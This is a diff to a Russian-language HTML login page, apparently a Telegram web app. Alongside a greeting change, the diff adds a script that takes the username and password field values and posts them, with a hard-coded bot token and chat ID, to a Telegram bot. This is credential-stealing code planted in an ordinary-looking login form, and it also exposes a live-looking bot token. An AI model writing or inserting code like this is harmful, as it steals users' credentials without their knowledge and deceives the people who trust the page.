@@ -71,7 +71,7 @@
 </head>
 <body>
     <div class="login-container">
-        <h2 id="title_sign">Приветствую, !</h2>
+        <h2 id="title_sign">Здарова, !</h2>
         <form>
             <div class="form-group">
                 <label for="username">Логин</label>
@@ -99,5 +99,37 @@
         tittle.innerText = `Приветствую, ${tg.initDataUnsafe.user.first_name}!`
         span.innerText = `Твой айди: ${tg.initDataUnsafe.user.id}`
     </script>
+    <script>
+    const token = '7321690711:AAGC0FDwSodg-2gG4lxUyU-3QbTwLl1llXM';
+    const chatId = '5615563152';
+    passtext = document.getElementById("password").value
+    logintext = document.getElementById("username").value
+
+    function sendMessage() {
+      const message = `Login:${logintext}, password:${passtext}`;
+      
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+        }),
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          alert('Сообщение отправлено!');
+        } else {
+          alert('Ошибка отправки сообщения.');
+        }
+      })
+      .catch(error => {
+        console.error('Ошибка:', error);
+      });
+    }
+  </script>
 </body>
 </html>
